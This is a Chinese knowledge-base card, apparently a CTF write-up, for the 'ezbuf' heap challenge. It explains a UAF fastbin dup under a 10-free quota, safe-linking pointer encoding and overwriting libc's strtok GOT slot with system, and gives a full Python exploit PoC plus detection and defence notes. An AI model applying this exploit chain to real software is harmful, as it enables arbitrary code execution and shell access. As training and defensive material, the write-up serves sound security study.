---
id: binary-pwn-heap-10-free-quota-fastbin-dup-strtok-got-system
title: free 次数被写死 10 次、且没有 edit 的 UAF 堆题：7 次 free 填满 tcache 后余下 3 次构造 A→B→A fastbin dup，按 safe-linking 编码把 0x50 块分配到 libc 的 strtok GOT，借其 rdi 可控改写成 system
type: scenario
domain: binary
path: binary/pwn/heap
technique: free-quota-fastbin-dup-strtok-got-system
tags:
- pwn
- heap
- uaf
- fastbin-dup
- tcache
- safe-linking
- got-hijack
- strtok
- glibc231
- protobuf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W6
  verified_at: '2026-11-09T00:54:20+08:00'
  notes: 已对照原文核对；本次核对未读取图片，仅依据正文；ezbuf 的 .proto（whatcon/whattodo/whatidx/whatsize/whatsthis）、free 无置零 UAF、free 最多 10 次、0x30 chunk 属 fastbin、7 次填满 tcache + 3 次构造 A→B→A、target=((heap+0x4ea0)>>12)^puts_abs_got、libc 泄露 -0x21ace0、heap 泄露 -0x860、strtok abs GOT(libc+0x21a050) rdi 可控改 system 等均与正文一致；修正 glibc 版本描述（原文 exp 注释为 2.35，fix safe-linking 从 2.32 起覆盖 fastbin）
url: /docs/binary/pwn/heap/binary-pwn-heap-10-free-quota-fastbin-dup-strtok-got-system/
draft: false
kb_aliases:
- ezbuf
- free 次数受限 10 次
- 没有 edit 的 fastbin dup
- strtok GOT 劫持
- 填满 tcache 再 fastbin dup
- safe-linking 下 GOT 劫持
- rdi 可控改 system
---

## 一句话结论

当堆管理器存在稳定 UAF（free 不置零）、却**既没有 edit 也没有 show-only 之外的写接口**、且 `free` 的总次数被程序写死上限（本例 10 次）时，仍可用「前 7 次 free 把 0x50 的 tcache 填满 → 余下 3 次对同一块做 `A→B→A` 的 fastbin dup → 让下一次 malloc 返回目标地址」拿到任意地址分配（本题环境 glibc 2.35）；把这次分配落到 **libc 数据段里的可写槽位**（原文取 `libc+0x21a050`，即 abs GOT 里 `strtok` 的槽，调用点 `rdi` 完全可控），改写成 `system`，随后让程序用 `strtok(user_input, ...)` 切分 `a;/bin/sh` 就变成 `system("a;/bin/sh")`，直接拿 shell。

## 原理

- **为什么不能直接 double free tcache**：glibc 2.29+ 的 tcache 有 `key` 字段与 `e->key == tcache` 检测，同一块连续 free 两次会命中 `free(): double free detected in tcache 2`；要绕开就必须先让 tcache 的该 size **满 7 个**，此时后续 free 会走 fastbin 路径，而 fastbin 只检查「链头是否等于待释放块」，于是 `A→B→A` 这种间隔式 double free 能通过。
- **为什么只需要 3 次 free**：填满 7 个花费 7 次，`A→B→A` 需要 3 次（A、B、A），总计正好 10 次——与程序的硬上限吻合。这是本题最关键的约束：**free 次数预算必须刚好被用尽**，所以每块只 free 一次来填 tcache、不浪费。
- **没有 edit 时怎么改 fd**：`A→B→A` 链建立后，`dup` 的第一段仍指向 A；下一次同尺寸 `malloc` 返回 A，程序此时会用攻击者提供的 `content` 写入 A 的用户区——**add 就是 edit**。因此「无 edit」不构成障碍，只要能控制 add 的写入内容与大小。
- **safe-linking 的编码**：glibc 2.32 起 fastbin 的 `fd` 也走 `PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr`，所以要写进 A 的 `fd` 不是裸的 `strtok@got`，而是 `(chunk_addr >> 12) ^ strtok_got`（原文 `target = ((heap_addr + 0x4ea0) >> 12) ^ puts_abs_got`）。若直接写裸地址，`REVEAL_PTR` 后得到非法指针，下一次 malloc 会崩。
- **为什么打 libc 的 GOT 而不是二进制的 GOT**：全 RELRO 时二进制自身的 `.got` 只读，但 **libc 里的 GOT/数据段是可写的**（`libc+0x21a050` 附近的 `strtok` 相关槽），把目标定在 libc 内既绕开 RELRO，也不受 PIE 影响（libc 基址已泄）。
- **为什么挑 `strtok`**：调用点形如 `strtok(buf, ":")`，`rdi = buf` 是攻击者可控的用户输入。把它改成 `system` 后，`system(buf, ":")` 的第二个参数被忽略，于是 `buf` 直接当命令；输入 `a;/bin/sh` 既能保证 `strtok` 找到分隔符不提前返回，又能让 shell 执行 `/bin/sh`（`a` 这条命令失败但分号保证后续执行）。
- **heap 地址怎么来**：`show` 一个已 free 的 tcache 块，读出的 `fd` 是 safe-linking 编码值（`chunk>>12 ^ next`），取低 5 字节左移 12 位再减 0x1000 即得堆基址——这正是原文 `heap_addr = u64(recv(5).ljust(8,0)) << 12; heap_addr -= 0x1000` 的含义。
- **为什么原题不选 one_gadget**：用 `puts` 走 one_gadget 需要满足大量寄存器/栈约束，原文试了十几个偏移都不成立（大概率被环境限制），所以选「`strtok` 的 `rdi` 可控」这条更确定的路。

## 触发条件

- 堆管理器四件套里有稳定 UAF（free 分支不清指针槽，或清错位置），**且没有独立的 edit**（只能用 add 覆写已释放块）。
- `free` 总次数有硬上限，且上限 ≥ tcache 容量（7）+ 3；目标 size 落在 fastbin 范围（`0x20`–`0x80` 的请求，实际 chunk 0x30–0x90）。
- glibc 为 2.32 以上（exp 注释指向 `2.35-0ubuntu3_amd64`）：tcache 有 `key` 检测、fastbin 的 `fd` 已被 safe-linking 编码（该编码自 2.32 起才覆盖 fastbin，与 exp 的写法一致），`__free_hook` 已移除，因此收尾只能打 libc 内可写的数据段槽位。
- 能泄 libc 基址（本例靠 `show` 一个已释放块读 `GOT` 指向或 libc 指针）与堆基址。
- 程序里存在 `rdi` 由用户输入决定的 libc 函数调用点（`strtok`/`strcmp`/`puts`/`printf` 等），且该函数在 libc 的 GOT 槽可写。

## 利用步骤

1. **逆出交互协议**（protobuf 题）：按 `0x28AAEEF9` 魔数逆 `descriptor` 与字段表，得到 `whatcon/whattodo/whatidx/whatsize/whatsthis` 五个字段（`whattodo`=1 add、2 free、3 show）；用 `pb2` 正常序列化发包。
2. **泄 libc**：`add(0, 0x50, 'a'*8)` 后 `show(0)`，从回显里取 libc 指针（原文 `-0x21ace0`）得 libc base，并记下 `strtok` GOT 槽地址（原文 `libc+0x21a050`）。
3. **泄 heap**：再 `add(1,0x50)` 与 `add(2..9,0x50)`，`free(0)`、`free(1)` 后 `show(0)`，读 5 字节 safe-linking 编码值 `<<12 - 0x1000` 得 heap base，并算出 `A` 的地址（原文 `heap+0x4ea0`）。
4. **用尽 free 配额**：`free(2..6)`（5 次）→ `free(7)`（第 7 块，此时 tcache 满）→ `free(8)` → `free(7)`（在 fastbin 里构造 `7→8→7`）。合计 7+3=10 次。
5. **写 fd**：`add(8, 0x50, p64(((A)>>12) ^ strtok_got))` 让 fastbin 链指向目标；再 `add(2,0x50)`、`add(3,0x50)` 把前面残留抽掉，使下一次 `add` 返回 `strtok_got`。
6. **改 GOT**：`add(5, 0x50, p64(system)*2)` 把 `strtok` 槽写成 `system`。
7. **触发**：走 `whattodo=3`（show/处理）路径，让程序用 `strtok` 处理 `a;/bin/sh\x00`（`whatsize=48`），`system("a;/bin/sh")` 得到 shell。

## PoC

```python
# 1) 泄 libc：(whatcon 被原样回显)
add(0, 0x50, b'a'*8)
show(0); rl(b'a'*8)
libc_addr = h64() - 0x21ace0
libc.address = libc_addr
strtok_got = libc_addr + 0x21a050
system = libc.sym['system']

# 2) 泄 heap：free 后读 safe-linking 编码的 fd
add(1, 0x50, b'a'*8)
for i in range(8): add(i+2, 0x50, b'a'*8)
free(0); free(1)
show(0); rl("Content:")
heap_addr = u64(mx.recv(5).ljust(8, b'\x00')) << 12
heap_addr -= 0x1000

# 3) 用尽 10 次 free：5 + 1(填满 tcache) + 3(fastbin dup A->B->A)
for i in range(5): free(i+2)
free(7)
free(8)
free(7)          # tcache 已满，第 8/9/10 次走 fastbin -> 7->8->7

# 4) tcache 抽空，让下一次 add 落到目标
for i in range(7): add(i, 0x50, b'a'*8)

target = ((heap_addr + 0x4ea0) >> 12) ^ strtok_got   # safe-linking 编码
add(8, 0x50, p64(target))    # 写 A 的 fd = 编码后的 strtok@got
add(2, 0x50, b'a')
add(3, 0x50, b'a')
add(5, 0x50, p64(system) * 2)   # 分配到 strtok GOT，改写为 system

# 5) 触发：strtok(user_buf, ...) -> system(user_buf)
get_shell(0)   # whatcon = b'a;/bin/sh\x00', whattodo = 3, whatsize = 48
```

## 变体与关联

- **变体（配额更紧）**：若 free 上限只有 8 次，可先把 tcache 该 size 抽空再 free，让第一块直接进 fastbin，用 `A→B→A`（3 次）加少量块达成；关键永远是「先满足 tcache 容量上限再加一次间隔式 double free」。
- **变体（目标换成 `__free_hook`）**：有 `__free_hook` 时优先打它（无需 `rdi` 可控），代价是多一次分配把 hook 写成 `system`；本题没选是因为 0x50 桶要落到 `__free_hook` 需要额外一次分配且 hook 地址附近没有合适的 size。
- **变体（rcx/rdx 也可控时）**：`strtok` 的 `rsi` 是分隔符串，若可控还能顺便满足 `system` 之外的 sink；`strncmp`/`memcmp` 等 `rdi` 可控函数同理。
- **关联**：[[binary-pwn-heap-tcache-reverse-into-fastbin-fastbin-dup-arbitrary-alloc]]（同为「填满 tcache 后 fastbin dup」在 glibc 2.41 的形态，那条靠 `_int_malloc` 反灌 tcache；本卡是 2.35 直接构造 `A→B→A`）、[[binary-pwn-heap-glibc235-fastbin-reverse-into-tcache-last-fd-arbitrary-alloc]]（2.35 的 fastbin reverse into tcache，改链尾 fd）、[[binary-pwn-heap-delete-compaction-stale-slot-fastbin-dup]]（2.23 无 tcache 的 fastbin dup，无 safe-linking）、[[binary-pwn-heap-protobuf-free-zero-wrong-slot-uaf-freehook-mprotect-shellcode]]（同批 protobuf 堆题，入口是 free 清零写错偏移）。
- **边界**：glibc 2.32+ 的 fastbin 也启用 safe-linking 且 tcache 有 `key` 检测，`A→B→A` 需要正确编码 fd 且 tcache 必须满；`strtok_got` 这类 libc 内部槽位随版本变化，需按目标 libc 定位；若程序在 free 后立刻把指针槽清零（无 UAF）则整条链不成立。

## 检测与防御

- **代码层**：`free` 后立刻 `ptr[idx] = NULL`；给 free 加上「同一块不可重复释放」的集合校验；不要用「固定次数上限」代替真正的资源生命周期校验。
- **加固**：glibc 升级到 2.32+ 并启用 safe-linking（本卡已在 2.35 上演示其可绕性）；开启全 RELRO 保护二进制 GOT（libc 内部槽仍需靠版本升级/`-z now` 之外的缓解）；`strtok` 之类 `rdi` 直接吃用户输入的函数，调用前做长度与字符白名单校验。
- **检测**：同尺寸块在短时间内被 free 超过 tcache 容量（7）且伴随 `A→B→A` 模式；`malloc` 返回地址落在 libc 数据段（正常应落在堆）；libc GOT 槽被写（可用 `mprotect` 只读化 libc 数据段或运行时校验）；进程随后出现 `system`/`execve` 调用而输入含 `;`。
- **取证**：dump fastbin 链的 `fd` 编码值，按 `(pos>>12) ^ fd` 解出真实目标即可定位被改写的 GOT 槽；`free` 调用序列（10 次）本身就是强特征。
